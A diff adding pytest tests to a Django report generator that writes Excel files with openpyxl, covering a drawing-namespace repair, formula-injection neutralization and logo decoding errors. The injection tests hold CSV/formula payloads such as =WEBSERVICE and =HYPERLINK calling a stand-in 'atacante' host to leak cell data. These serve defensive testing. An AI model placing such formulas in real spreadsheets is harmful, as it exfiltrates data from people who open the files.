@@ -863,3 +863,247 @@ def test_claves_obligatorias_coincide_con_validar_completitud(definicion_valida)
         _validar_completitud(estructura, {})
 
     assert set(claves_obligatorias(estructura)) == set(excinfo.value.faltantes)
+
+
+# ---------------------------------------------------------------------------
+# Reparación del namespace de los dibujos (defecto reportado el 2026-09-01)
+# ---------------------------------------------------------------------------
+
+
+def test_reparar_dibujos_prefija_elementos_drawingml():
+    """openpyxl 3.1.5 serializa `avLst` y `prstDash` SIN el prefijo `a:`
+    dentro de `xl/drawings/drawingN.xml`.
+
+    Ese documento declara `xmlns=` apuntando al namespace
+    `spreadsheetDrawing`, así que un elemento sin prefijo cae en el namespace
+    equivocado: `prstGeom` exige `a:avLst` del namespace `drawingml/main`.
+    Excel considera el dibujo inválido, lo descarta entero y abre el archivo
+    con el diálogo "Parte quitada: /xl/drawings/drawing1.xml (Forma de
+    dibujo)" — el logo institucional desaparece del reporte entregado.
+
+    Reproducido con un `load_workbook` + `save` puro sobre la plantilla, sin
+    intervención de este proyecto: es un defecto de openpyxl, y se repara
+    después de guardar."""
+    from tipos_reporte.generador import _prefijar_drawingml
+
+    entrada = (
+        b'<a:prstGeom prst="rect"><avLst /></a:prstGeom>'
+        b'<a:ln><a:noFill /><prstDash val="solid" /></a:ln>'
+    )
+
+    salida = _prefijar_drawingml(entrada)
+
+    assert b"<a:avLst />" in salida
+    assert b'<a:prstDash val="solid" />' in salida
+    # No debe re-prefijar lo que ya estaba correcto.
+    assert b"<a:a:" not in salida
+
+
+def test_reparar_dibujos_no_toca_elementos_ya_prefijados():
+    """Idempotencia: pasar dos veces por la reparación no debe duplicar el
+    prefijo, para que sea seguro aplicarla sin conocer el estado previo."""
+    from tipos_reporte.generador import _prefijar_drawingml
+
+    una_vez = _prefijar_drawingml(b'<a:prstGeom><avLst /></a:prstGeom>')
+    dos_veces = _prefijar_drawingml(una_vez)
+
+    assert una_vez == dos_veces
+
+
+# --- Formula injection (SECURITY-REPORT.md F-01) -------------------------
+#
+# openpyxl infers a cell's data type from the string it is assigned: any
+# value starting with "=" is serialized as a live formula (data_type "f"),
+# not as text. Wizard fields are free text, so a captured value must never
+# be able to decide that it is a formula. These tests pin the neutralization
+# at the single write point (`_escribir_valores`), which is the only path
+# any captured value can take into the workbook.
+
+
+@pytest.mark.parametrize(
+    "valor",
+    [
+        '=WEBSERVICE("http://atacante/")',
+        '=HYPERLINK("http://atacante/","Ver")',
+        "=1+1",
+        "+1+1",
+        "-1+1",
+        "@SUM(A1:A9)",
+        chr(9) + "clase",
+        chr(13) + "clase",
+    ],
+)
+def test_valor_con_prefijo_de_formula_se_escribe_como_texto(valor):
+    """F-01 RED: a captured value whose first character makes Excel treat it
+    as a formula must land in the cell as TEXT (`data_type == "s"`), with
+    its characters preserved exactly. Asserted on the in-memory worksheet,
+    before serialization, so the check is about the cell's declared type and
+    not about what a reload happens to infer."""
+    import openpyxl
+
+    from tipos_reporte.generador import _escribir_valores
+
+    estructura = {
+        "hoja": "REPORTE",
+        "secciones": [
+            {
+                "id": "datos-generales",
+                "campos": [{"id": "obs", "tipo": "texto", "celda": "B2"}],
+            }
+        ],
+    }
+    hoja = openpyxl.Workbook().active
+
+    _escribir_valores(hoja, estructura, {"obs": valor})
+
+    assert hoja["B2"].data_type == "s"
+    assert hoja["B2"].value == valor
+
+
+def test_valor_de_texto_normal_sigue_siendo_texto():
+    """F-01 RED (companion): neutralization must not change the existing
+    behavior for ordinary values — same `data_type`, same value."""
+    import openpyxl
+
+    from tipos_reporte.generador import _escribir_valores
+
+    estructura = {
+        "hoja": "REPORTE",
+        "secciones": [
+            {
+                "id": "datos-generales",
+                "campos": [{"id": "obs", "tipo": "texto", "celda": "B2"}],
+            }
+        ],
+    }
+    hoja = openpyxl.Workbook().active
+
+    _escribir_valores(hoja, estructura, {"obs": "Turno mañana"})
+
+    assert hoja["B2"].data_type == "s"
+    assert hoja["B2"].value == "Turno mañana"
+
+
+def test_valores_no_string_conservan_su_tipo_nativo():
+    """F-01 RED (companion): neutralization applies to strings only. A
+    numeric or boolean value must keep openpyxl's native type — coercing
+    everything to text would silently change how the delivered .xlsx
+    formats and sums those cells."""
+    import openpyxl
+
+    from tipos_reporte.generador import _escribir_valores
+
+    estructura = {
+        "hoja": "REPORTE",
+        "secciones": [
+            {
+                "id": "datos-generales",
+                "campos": [
+                    {"id": "cantidad", "tipo": "numero", "celda": "B2"},
+                    {"id": "activo", "tipo": "booleano", "celda": "B3"},
+                ],
+            }
+        ],
+    }
+    hoja = openpyxl.Workbook().active
+
+    _escribir_valores(hoja, estructura, {"cantidad": 42, "activo": True})
+
+    assert hoja["B2"].data_type == "n"
+    assert hoja["B2"].value == 42
+    assert hoja["B3"].data_type == "b"
+    assert hoja["B3"].value is True
+
+
+@pytest.mark.django_db
+def test_formula_capturada_sobrevive_como_texto_al_documento_generado(
+    tipo_de_reporte_factory, plantilla_xlsx
+):
+    """F-01 RED (end to end): the neutralization must survive
+    `generar_reporte`'s full save/repair round trip — this is the property
+    that actually protects whoever opens the delivered file."""
+    from tipos_reporte.generador import generar_reporte
+
+    estructura = {
+        "tipo": "instalacion-resinas",
+        "plantilla": "JME.PC-0001.F1.xlsx",
+        "hoja": "REPORTE",
+        "secciones": [
+            {
+                "id": "datos-generales",
+                "titulo": "Datos generales",
+                "campos": [
+                    {
+                        "id": "observaciones",
+                        "etiqueta": "Observaciones",
+                        "tipo": "texto",
+                        "obligatorio": True,
+                        "celda": "B2",
+                    }
+                ],
+            }
+        ],
+    }
+    definicion = _definicion_con_plantilla(
+        tipo_de_reporte_factory, plantilla_xlsx, estructura
+    )
+    ataque = '=HYPERLINK("http://atacante/?d="&A1,"Ver detalle")'
+
+    resultado = generar_reporte(definicion, {"observaciones": ataque})
+
+    hoja = load_workbook(resultado)["REPORTE"]
+    assert hoja["B2"].data_type == "s"
+    assert hoja["B2"].value == ataque
+
+
+# --- Undecodable logo must not become a 500 (SECURITY-REPORT.md F-09) ----
+
+
+@pytest.mark.django_db
+def test_logo_indecodificable_lanza_problema_de_generacion(
+    tipo_de_reporte_factory, plantilla_xlsx, imagen_png
+):
+    """F-09 RED: `_intercambiar_logo` called `ImagenOpenpyxl(...)` bare,
+    unlike `_incrustar_adjuntos` which wraps it. An administrator uploading
+    a file Pillow cannot decode as `logo` therefore raised something that is
+    NOT `ProblemaDeGeneracion`, so `views.generar` did not catch it and the
+    user got a raw 500 — the exact failure mode design D6 forbids — on every
+    generation of that tipo, permanently.
+
+    The logo is NOT skipped the way an attachment is: an attachment is one
+    of many and the report is still valid without it, while the logo is the
+    company's mark on the delivered document. Failing loudly with a typed,
+    catchable problem is right; silently shipping an unbranded report is
+    not."""
+    from tipos_reporte.generador import ProblemaDeGeneracion, generar_reporte
+
+    estructura = {
+        "hoja": "REPORTE",
+        "secciones": [
+            {
+                "id": "datos-generales",
+                "campos": [
+                    {"id": "turno", "etiqueta": "T", "tipo": "texto", "celda": "B2"}
+                ],
+            }
+        ],
+    }
+    # The template needs a real image: `_intercambiar_logo` only swaps when
+    # there is an existing anchor to reuse, so without one the broken logo
+    # is never opened and the bug does not surface.
+    ruta_imagen = imagen_png(nombre="original.png", tamano=(10, 10))
+    destino = plantilla_xlsx(nombre_hoja="REPORTE", imagen=ruta_imagen)
+    tipo = tipo_de_reporte_factory(
+        plantilla=SimpleUploadedFile("plantilla.xlsx", destino.read_bytes()),
+        logo=SimpleUploadedFile("logo.png", b"esto-no-es-una-imagen"),
+    )
+    definicion = DefinicionDeTipo.objects.create(
+        tipo=tipo,
+        archivo_yaml=SimpleUploadedFile("definicion.yaml", b"secciones: []"),
+        yaml_fuente="secciones: []",
+        estructura=estructura,
+        estado=Estado.BORRADOR,
+    )
+
+    with pytest.raises(ProblemaDeGeneracion):
+        generar_reporte(definicion, {"turno": "Mañana"})
